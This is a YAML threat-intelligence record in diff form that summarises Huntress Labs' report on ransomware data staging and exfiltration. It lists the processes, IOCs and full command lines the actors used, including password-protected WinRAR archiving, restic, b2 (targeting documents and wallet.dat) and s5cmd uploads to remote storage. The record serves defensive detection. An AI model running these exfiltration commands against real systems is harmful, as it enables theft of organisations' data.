@@ -1,0 +1,59 @@
+description: Huntress observed data staging and exfiltration techniques used by ransomware
+  threat actors, including the use of archival tools like WinRAR and 7Zip, cloud storage
+  sites such as MEGASync, and open-source tools like s5cmd.
+TTPs:
+  processes:
+  - C:\\Users\\user\\Downloads\\7-ZipPortable\\App\\7-Zip64\\7zG.exe
+  - WinRAR.exe
+  - restic.exe
+  - b2.exe
+  - s5cmd.exe
+  - fzsftp.exe
+  commandline:
+  - C:\\Users\\user\\Downloads\\7-ZipPortable\\App\\7-Zip64\\7zG.exe a -i#7zMap19592:2148:7zEvent5339
+    -ad -saa -- \"\\\\[REDACTED]\\Data\\Data\"
+  - WinRAR.exe a -m5 -v3g -tn365d -n*.bmp -n*.doc -n*.docx -n*.xls -n*.xlsx -n*.pdf
+    -n*.txt -hp[REDACTED] \"C:\\DATA\\data.rar\"
+  - WinRAR.exe a -m0 -v3g -tn1000d -n*.txt -n*.pdf -n*.xls -n*.doc -n*.xlsx -n*.docx
+    -hp[REDACTED] \"C:\\DATA\\done\\DATA.rar\"
+  - restic.exe -r rest:http://[REDACTED]:8000/ --password-file ppp.txt --use-fs-snapshot
+    --verbose backup \\\\[REDACTED]
+  - b2.exe sync \\\\[REDACTED]\\ b2://{REDACTED] --include-regex \"(?i).*\\.(doc|xls|xlsx|docx|pdf|csv)$|wallet\\.dat$
+    --exclude-regex \".*\" --keep-days 1826 --allow-empty-source --skip-hash-verification
+    --exclude-all-symlinks --threads 30
+  - s5cmd --credentials-file credentials cp --include \"*.pdf\" --include \"*.png\"
+    --include \"*.jpg\" --include \"*.jpeg\" --include \"*.xls\" --include \"*.xlsx\"
+    --include \"*.tif\" --include \"*.zip\" --include \"*.doc\" --include \"*.docx\"
+    \"[Folder]\" s3://[Resource]
+  powershell: []
+  scripting_engine:
+  - s5cmd.exe
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - restic.exe -> rest:http://[REDACTED]:8000/
+  - b2.exe -> b2://{REDACTED]
+  - s5cmd.exe -> s3://[Resource]
+  file_activity:
+  - C:\\Users\\user\\Downloads\\7-ZipPortable\\App\\7-Zip64\\7zG.exe
+  - C:\\DATA\\data.rar
+  - C:\\DATA\\done\\DATA.rar
+  - \\\\[REDACTED]\\Data\\Data
+  persistence: []
+  pipes: []
+  process_relations:
+  - WinRAR.exe -> fzsftp.exe
+IOCs:
+  hashes: []
+  IPs: []
+  domains:
+  - '[REDACTED]'
+  - '[Resource]'
+  URLs:
+  - http://[REDACTED]:8000/
+  - b2://{REDACTED]
+authors:
+- Huntress Labs
+reference: https://www.huntress.com/blog/exposing-data-exfiltration-lolbin-ttp-binaries
+date_of_publication: August 19, 2025
+file_creation_date: August 19, 2025
